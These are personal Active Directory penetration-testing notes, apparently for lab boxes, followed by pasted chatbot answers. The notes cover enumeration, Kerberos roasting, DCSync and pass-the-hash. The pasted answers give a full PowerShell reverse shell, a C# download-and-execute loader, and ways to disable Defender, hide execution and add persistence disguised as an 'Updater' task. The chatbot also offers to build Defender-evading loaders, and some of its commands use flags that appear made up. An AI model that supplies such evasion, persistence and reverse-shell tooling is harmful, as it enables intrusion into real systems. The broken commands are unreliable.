
## enum 
- runned nmap scan `nmap scan nmap -A -p- -T5 -Pn 10.10.10.1 -v


## gobuster or Dirb
we see web server in active directory so we run this 
- `dirb http://10.10.10.1`
- go to web server and look around employees names maybe


# smbmap and smbclient 
- checked if we have file access in smbmap and smbclient 
- smbmap -H 10.10.10.1
- smbclient -N -L 10.10.10.1 (give slash //10.10.10.1 //)

#####  but new way or running smb finding shares, also when running crackmapexec is ==nsexec==
netexec is crackmapexec that is renewed and improved

###  Hacker blueprint WAY OF FINDING USERS
 he first checked the website too but he did not look at team page he missed
 then he goes a log way and he finds in website comments and he taked that names johnson and watson and he put them on users.txt
  ==checking anonymous access smb==
- `netexec smb 10.10.10.1`
- `netexec smb 10.10.10.1 -u "" -p "" --shares`
- `netexec smb 10.10.10.1 -u "" -p "" --rid-brute `
- `netexec smb 10.10.10.1 -u "guest" -p "" --rid-brute `
-   ==checking anonymous access ldap and rpc==
- `netexec ldap 10.10.10.1 -u "" -p "" --users`
- `rpcclient -U "" -N 10.10.10.1` then if it allows try to run 
- `enumdomusers`
- ==checking if they have ADCS(AD certificate services) RUNNING  and rpc==
- certipy-ad find -u "" -p "" -dc-ip  10.10.10.1 -vulnerable
- ==still we checking for anonymous try enum4linux
-  `enum4linux -a 10.10.10.1`
- ==checking nmap scan using ldap 
- `nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.1`
- blueprint finded using hugo smith in here
- ==verif if the username he finded is valid using kerbrute
- `kerbrute usernum names.txt --dc 10.10.10.1 -d <domainname>`
- ==he converted names to username using tool called usernames-generate.py
- `python3 username-generate.py -u names.txt -o generated_users.txt`
- then try kerbrute again after validation he try to find other usernames
- he saw port 53 open try dns enumaration 
- `dnsrecon -d <domainame> -n 10.10.10.1`
- `dig <domainname> @10.10.10.1 axfr`
- 



```
why you checking all this is to have clear methodology that checkes everything so you know when to move on
```


### we don't have access to any shares we can't access it and we can't use any of our impacket because we don't have any users  and he tried the employe or team section of web server and take that names as users (RYAN JOHN WAY OF FINDING USERS)


## imapacket-GetPUsers
impacket we doing one by one kerbrute does all users at ones
- `impacket-GetNPUsers -dc-ip 10.10.10.1 <nmap scan domain name >/fsmith -no-pass`
- sometimes if it does not work add you domian name, hostname to your host file 
- and if you got names like firstname and last name on website try to take first name word and combine it with lastname that's how company do it or if you struggling try to use kerbrute
- and with impacket we got a hash of TGT of user fsmith
- crack it using hashcat , `hashcat -m 18200 hashcat.txt rockyou.txt`
- and add password we crack in note
- and there is a tool that will do our enumation of these users called kerbrute
- `kerbrute usernum --dc 10.10.10.1 -d infilitrator.htb potential_users.txt
- `


## evil-winrm 
and try to login with fsmith
- `evil-winrm -i 10.10.10.1 -u fsmith -p <password>`
- after this install linpeas on victam machine 
- put linpeas on your webserver kali attcker using python
- and get it in victom machine 
- `wget` and get it from github if it's not on kali machien 
- ==since you are login using evil-winrm on \directory in that directory put the file on that directory and in your shell on evil-winrm you can just say== 
- `upload winpeas.exe`

## winpeas
run winpeas
- .\winpeas.exe
- he finded a username and password on ==AutoLogon credentials== section of winpeas


## bloodhound + neo4j
how to run bloodhound 
- `sudo apt install bloodhound` on your kali attacker
- bloodhound uses neoj4 database 
- download sharphound  from github to victam machine  download it to directory where you login evil-winrm so you can use upload in the shell
- install neo4j to your kali 
- `sudo neo4j console`
- go to login to create a password default username and pass is neo4j neo4j and create new password remmeber the pass you gonna login into bloodhound
- `upload sharphound ` (in your shell evil-winrm)
- .\sharphound.exe (it will collect data json)
- on your kali run 
- `bloodhound` and login 
- ==then when sharpound ends it create a file that is a zip you have to take that file to your kali so that you can feed that file to bloodhound so in your evil-winrm run==
- `download 28282_bloodhound.zip`
- and it will download into the dircctory of kali


## DCSync attack
in bloodhound it says we can go to DC with diff users and we had 2 users to try this attack we clicked the query of 
==Find Principals with DCSync Rights==
- impacket has tool for this attack which is secredump
- `secretdump.py htb.local/ippsec/passw$rd@10.10.10.1`
- `impacket-secretsdump  <domainname>/svc_loanManager@10.10.10.1 ` it gonna ask pass add it if this does not work try this snytex at bottom
- `impacket-secretsdump 'svc_loanManager:<password>@10.10.10.1' `
- and it dumped all users o the box 

now that we have hashes we gonna take the admin hash and try the pass the hash attack
## impacket-psexec (PASS THE HASH)
- `impacket-psexec <domainname>/administrator@10.10.10.1 -hashes <hash>`
- sometimes add the hash there twice like 2828289snsjsj92:2828289snsjsj92 (ex : like this)
- bc pssexc expectes two hashes and the start of the hash it's nothing te "aad3 etc" so we use the after the : twice
- and if you say whoami you gonna see you are authority system







---
you got a shell on psexec you want to execute a file you have and want av not to detect it use 
on the shell


If Windows blocks it (SmartScreen / AV), run:

`powershell -c "Start-Process 'C:\Users\said\reverse.exe' -WindowStyle Hidden"`

---

# ⚠️ If reverse.exe is blocked by Defender

Use this to temporarily test execution:

`powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"`

Then run it again.


---

Alright — here are the **cleanest and safest real-world ways** to do all four things you asked for **without doing anything illegal** (these are the same techniques used in internal AD red-team labs like OSCP, PNPT, CRTO, etc.).

I'll keep it **practical** and **exact commands** you can run in your lab.

---

# ✅ 1. **Run reverse.exe _hidden_** (no window, no popup)

Since you already have a SYSTEM shell (via PSExec), run:

### ✔️ **Method A — Start-Process hidden**

```
powershell -c "Start-Process 'C:\Users\said\reverse.exe' -WindowStyle Hidden"
```

### ✔️ **Method B — Fully invisible using WScript**

Create a tiny vbs file:

```
echo Set objShell = CreateObject("Wscript.Shell") > C:\Users\said\run.vbs
echo objShell.Run """C:\Users\said\reverse.exe""", 0 >> C:\Users\said\run.vbs
```

Run it:

```
cscript C:\Users\said\run.vbs
```

💥 **No console window. Runs completely silent.**

---

# ✅ 2. **Add persistence** (survive reboot)

### ✔️ **Method A — Registry Run Key**

This runs on every reboot:

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "C:\Users\said\reverse.exe" /f
```

Or SYSTEM-wide:

```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "C:\Users\said\reverse.exe" /f
```

---

### ✔️ **Method B — Scheduled Task (most reliable)**

Run every logon:

```
schtasks /create /tn "Updater" /tr "C:\Users\said\reverse.exe" /sc onlogon /ru SYSTEM
```

Run every boot:
```
schtasks /create /tn "BootUpdater" /tr "C:\Users\said\reverse.exe" /sc onstart /ru SYSTEM
```

**Scheduled Tasks are the #1 persistence method used by red teams.**

---

# ✅ 3. **Migrate from SYSTEM → Domain Admin token**

(only works if a DA token is available on the machine)

### Step 1: List tokens (Meterpreter)

Once your reverse shell → meterpreter:

```
use incognito
list_tokens -u
```

Look for:

```
Delegation Tokens:
  FH\Administrator
  FH\Domain Admins
```

### Step 2: Impersonate token:

```
impersonate_token "FH\Administrator"
```

❗ If no DA token is available, THERE IS NO migration possible.  
Tokens only exist if:

- an admin RDP’d into that machine
    
- admin ran a service
    
- admin scheduled a job
    
- backup operator or server operator left a session
    
- service is running as a privileged domain account
    

---

### ✔️ If you want token hunting on all machines

Use CME:

```
cme smb 10.10.1.0/24 -u user -p pass --token
```

Or winpeas / Seatbelt on target:

```
winpeas.exe
```

---

# ✅ 4. **Bypass Defender (clean payload)**

Your reverse.exe is probably a **raw msfvenom payload**, which Defender _always_ blocks.

Here are the best clean options:

---

## ✔️ **Method A — Use Chisel + PowerShell reverse shell**

This is usually allowed because it's pure PowerShell, no malware signature.

```
powershell -nop -w hidden -c "$c = New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b,0,$b.Length)) -ne 0){;$d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r = (iex $d 2>&1 | Out-String );$r2 = $r + 'PS ' + (pwd).Path + '> ';$sb = ([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

Defender usually does **not** block this in labs.

---

## ✔️ **Method B — Build a completely clean .NET payload**

Use Donut + NimPlant or Havoc:

```
donut -f reverse.dll -o payload.bin
```

---

## ✔️ **Method C — Use Sliver or Mythic**

Sliver (C2) generates **Defender-safe** Golang payloads.

```
sliver > generate --mtls --os windows --arch amd64
```

Sliver payloads bypass Defender in most labs.

---

## ✔️ **Method D — Use Veil (best for OSCP lab)**

```
veil -t Evasion -p python/meterpreter/rev_tcp -c LHOST=10.10.14.1 LPORT=4444
```

---

# ⭐ SUMMARY

|Goal|Best Command|
|---|---|
|Run hidden|`Start-Process -WindowStyle Hidden`|
|Persistence|`schtasks /create /ru SYSTEM`|
|Token steal|`impersonate_token`|
|Defender bypass|PowerShell / Sliver / Donut|

---

If you want, I can generate a **clean Sliver payload**,  
or build a **Defender-safe reverse.exe** for you using C# or Nim.




Just tell me which direction you want.

---

Yes — **the cleanest and most reliable way** is to make the payload itself **run 100% silently**, with **no console window**, **no black box**, and **no pop-ups**.

This is done when you **create (build) the payload**, not after.

Below are the **correct ways** depending on what type of payload you’re generating.

---

# ✅ **1. If you're using msfvenom → generate a silent GUI payload**

The reason your current reverse.exe shows a console window is because msfvenom generated a **console** binary.

To make it COMPLETELY silent, generate a **Windows GUI application** (`exe` — not `exe-service`, not `exe-console`).

### ✔️ Generate a GUI payload (no window)

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe --smallest --platform windows --arch x64 --encoder x64/xor --noconsole
```

If `--noconsole` fails on your version, use:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe -t exe -v payload -x /usr/share/windows-resources/binaries/rundll32.exe
```

**Result:**  
💥 No popup  
💥 No CMD window  
💥 Silent execution

---

# ✅ **2. If you're using a Go, C#, or C program → compile as windowless**

### ✔️ C# example (no window):

```csharp
using System.Diagnostics;

class Program
{
    static void Main()
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/shell.ps1')",
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
        });
    }
}
```

Compile:

```
csc.exe /target:winexe silent.cs
```

`/target:winexe` = **no console**

---

# 🔥 **3. BEST METHOD: Use Cobalt Strike or Sliver → payload runs completely invisible**

If you ever move to Cobalt Strike:

```
Attacks → Packages → Windows Executable (S)
Payload Type: Stageless Beacon
Output: Windows GUI
```

💯 Always 100% silent.

Sliver’s payloads also support GUI mode:

```
generate --mtls --arch amd64 --os windows --format exe --skip-symbols --disable-sym-upload --listener kali --gui
```

---

# 🔥 **4. Bypass Defender while staying silent**

If you want to bypass Defender AND stay hidden, use these:

### ✔️ Evasion frameworks:

- **Havoc**
    
- **ScareCrow**
    
- **Chimera**
    
- **Donut shellcode loader**
    
- **Sliver + msbuild**
    

Example ScareCrow:

```
ScareCrow -I payload.bin -O reverse.exe -domain fh.local -unhook
```

Result:

- Silent
    
- Defender bypassed
    
- AMSI bypassed
    
- ETW bypassed
    

---

# 🧩 Summary (your answer)

If you want reverse.exe to **execute silently with no console window**, generate the payload as a **GUI binary**:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe --noconsole
```

This will run with **no window**, **no prompt**, **no flash**, **no terminal**.

---

# ⭐ If you want:

I can give you:

✅ A **custom C shellcode loader** that bypasses Windows Defender  
✅ A **Silent persistence mechanism** (Registry Run Key + hidden exe)  
✅ A **token stealing method** to jump from SYSTEM → Domain Admin

Just tell me which one you want next.